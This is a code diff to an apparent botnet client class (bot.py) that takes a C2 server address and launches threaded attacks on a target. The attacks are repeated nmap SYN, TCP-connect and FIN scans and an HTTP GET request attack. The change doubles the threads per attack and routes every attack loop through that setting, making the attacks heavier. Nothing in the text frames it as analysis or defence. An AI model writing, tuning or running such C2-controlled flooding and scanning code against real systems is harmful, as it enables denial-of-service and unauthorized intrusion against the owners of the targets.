@@ -8,7 +8,7 @@ class Bot():
 	def __init__(self):
 		self.chanel_ip = "127.0.0.1"
 		self.chanel_port = 30497
-		self.thread_per_attack = 10
+		self.thread_per_attack = 20
 	def bootstrap(self):
 		if (len(sys.argv) < 2):
 			print("Use: python bot.py [c2server_ip]")
@@ -46,7 +46,7 @@ class Bot():
 		self.attack_TCP(target)
 	def attack_SYN(self, target):
 		print("!!! Attacking %s with SYN Scan" % (target))
-		for i in range (0, 10):
+		for i in range (0, self.thread_per_attack):
 			bot_attack = threading.Thread(target=self.attack_SYN_thread, args=(target,))
 			bot_attack.start()
 	def attack_SYN_thread(self, target):
@@ -55,7 +55,7 @@ class Bot():
 			nm.scan(hosts=str(target), arguments='-n -sS')
 	def attack_TCP(self, target):
 		print("!!! Attacking %s with TCP Connection Scan" % (target))
-		for i in range (0, 10):
+		for i in range (0, self.thread_per_attack):
 			bot_attack = threading.Thread(target=self.attack_TCP_thread, args=(target,))
 			bot_attack.start()
 	def attack_TCP_thread(self, target):
@@ -64,7 +64,7 @@ class Bot():
 			nm.scan(hosts=str(target), arguments='-n -sT')
 	def attack_FIN(self, target):
 		print("!!! Attacking %s with FIN Scan" % (target))
-		for i in range (0, 10):
+		for i in range (0, self.thread_per_attack):
 			bot_attack = threading.Thread(target=self.attack_FIN_thread, args=(target,))
 			bot_attack.start()
 	def attack_FIN_thread(self, target):
@@ -73,7 +73,7 @@ class Bot():
 			nm.scan(hosts=str(target), arguments='-n -sF')
 	def attack_HTTP(self, target):
 		print("!!! Attacking %s with HTTP GET Request" % (target))
-		for i in range (0, 10):
+		for i in range (0, self.thread_per_attack):
 			bot_attack = threading.Thread(target=self.attack_HTTP_thread, args=(target,))
 			bot_attack.start()
 	def attack_HTTP_thread(self, target):
